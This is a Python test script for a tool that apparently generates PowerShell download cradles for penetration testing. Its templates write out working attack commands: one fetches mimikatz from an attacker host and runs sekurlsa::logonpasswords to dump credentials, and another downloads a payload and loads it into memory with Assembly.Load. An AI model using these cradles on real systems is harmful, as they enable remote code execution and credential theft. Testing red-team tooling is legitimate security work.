#!/usr/bin/env python3
"""
Integration test for conditional blocks in ps-features.yaml cradles
Tests the actual mimikatz example added to ps-features.yaml
"""
import sys
import re
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from src.web.app import process_conditional_blocks

def test_mimikatz_cradle():
    """Test the mimikatz cradle with conditional args"""
    print("="*70)
    print("Testing Mimikatz Cradle with Conditional Args")
    print("="*70)
    
    # The actual template from ps-features.yaml
    template = '''(New-Object System.Net.WebClient).DownloadFile("{{ url }}/{{ output_file }}", "$env:TEMP\\{{ output_file }}");
& "$env:TEMP\\{{ output_file }}" {{ if args }}"{{ args }}"{{ fi }} "privilege::debug"'''
    
    # Test 1: With arguments
    print("\n1. With custom command (sekurlsa::logonpasswords):")
    print("-" * 70)
    
    variables_with = {
        'url': 'http://192.168.1.100:8080',
        'output_file': 'mimikatz.exe',
        'args': 'sekurlsa::logonpasswords'
    }
    
    result = process_conditional_blocks(template, variables_with)
    # Apply variable substitution
    for key, value in variables_with.items():
        result = result.replace('{{ ' + key + ' }}', value)
    
    print(f"Args: {variables_with['args']}")
    print(f"\nGenerated PowerShell:")
    print(result)
    print(f"\nExpected behavior: mimikatz executes with both commands")
    
    # Test 2: Without arguments
    print("\n2. Without custom command (empty args):")
    print("-" * 70)
    
    variables_without = {
        'url': 'http://192.168.1.100:8080',
        'output_file': 'mimikatz.exe',
        'args': ''
    }
    
    result = process_conditional_blocks(template, variables_without)
    # Apply variable substitution
    for key, value in variables_without.items():
        result = result.replace('{{ ' + key + ' }}', value)
    
    print(f"Args: (empty)")
    print(f"\nGenerated PowerShell:")
    print(result)
    print(f"\nExpected behavior: Only 'privilege::debug' command is passed")
    
    # Verify the critical parts
    print("\n" + "="*70)
    print("Verification:")
    print("="*70)
    
    # Check with args
    variables_with_test = {'args': 'test', 'url': 'url', 'output_file': 'file'}
    result_with = process_conditional_blocks(template, variables_with_test)
    for k, v in variables_with_test.items():
        result_with = result_with.replace('{{ ' + k + ' }}', v)
    
    if '"test"' in result_with and '"privilege::debug"' in result_with:
        print("✓ WITH args: Both arguments appear correctly")
    else:
        print("✗ WITH args: Test failed!")
        
    # Check without args
    variables_without_test = {'args': '', 'url': 'url', 'output_file': 'file'}
    result_without = process_conditional_blocks(template, variables_without_test)
    for k, v in variables_without_test.items():
        result_without = result_without.replace('{{ ' + k + ' }}', v)
    
    # Should not have empty quotes
    if '""' not in result_without and '"privilege::debug"' in result_without:
        print("✓ WITHOUT args: No empty quotes, only privilege::debug")
    else:
        print("✗ WITHOUT args: Test failed!")
        print(f"  Result: {result_without}")

def test_assembly_load_cradle():
    """Test assembly loading cradle with multiple conditional variables"""
    print("\n\n" + "="*70)
    print("Testing Assembly Loading with Multiple Conditionals")
    print("="*70)
    
    template = '''$data = (New-Object System.Net.WebClient).DownloadData('{{ url }}/{{ output_file }}');
$assem = [System.Reflection.Assembly]::Load($data);
[{{ namespace }}.{{ class }}]::{{ entry_point }}({{ if args }}"{{ args }}".Split(){{ fi }}{{ if args }}){{ else }}){{ fi }}'''
    
    # Note: The above template shows a more complex example with potential {{ else }} support
    # For now, we'll test with the simpler version
    simple_template = '''$data = (New-Object System.Net.WebClient).DownloadData('{{ url }}/{{ output_file }}');
$assem = [System.Reflection.Assembly]::Load($data);
[{{ namespace }}.{{ class }}]::{{ entry_point }}({{ if args }}"{{ args }}".Split(){{ fi }})'''
    
    print("\nTest: Assembly load with args")
    print("-" * 70)
    
    variables = {
        'url': 'http://10.0.0.1',
        'output_file': 'payload.exe',
        'namespace': 'MyApp',
        'class': 'Program',
        'entry_point': 'Main',
        'args': 'arg1 arg2'
    }
    
    result = process_conditional_blocks(simple_template, variables)
    for k, v in variables.items():
        result = result.replace('{{ ' + k + ' }}', v)
    
    print(f"Generated: ...{result[-50:]}")
    if '"arg1 arg2".Split()' in result:
        print("✓ Args properly included with .Split()")
    
    variables['args'] = ''
    result = process_conditional_blocks(simple_template, variables)
    for k, v in variables.items():
        result = result.replace('{{ ' + k + ' }}', v)
    
    print(f"Without args: ...{result[-30:]}")
    if result.endswith('Main()'):
        print("✓ Empty parentheses when no args")

if __name__ == '__main__':
    test_mimikatz_cradle()
    test_assembly_load_cradle()
    
    print("\n" + "="*70)
    print("All integration tests completed!")
    print("="*70)
